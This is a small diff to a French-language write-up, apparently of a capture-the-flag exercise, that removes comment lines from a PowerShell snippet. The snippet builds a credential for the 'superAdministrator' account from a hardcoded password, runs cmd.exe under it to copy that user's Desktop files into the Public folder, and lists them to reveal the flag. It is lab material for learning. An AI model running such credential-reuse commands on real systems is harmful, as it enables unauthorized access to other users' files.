@@ -272,14 +272,8 @@ Utiliser PowerShell pour exécuter des commandes en tant que `superAdministrator
 ```powershell
 $password = ConvertTo-SecureString "P@ssword" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential("superAdministrator", $password)
-
-# Copier les fichiers du bureau de superAdministrator vers le dossier Public
 Start-Process "cmd.exe" -ArgumentList "/c copy C:\Users\superAdministrator\Desktop\* C:\Users\Public\" -Credential $cred
-
-# Attendre que la copie se fasse
 Start-Sleep -s 2
-
-# Lister le dossier Public pour voir le flag
 ls C:\Users\Public\
 ```
 
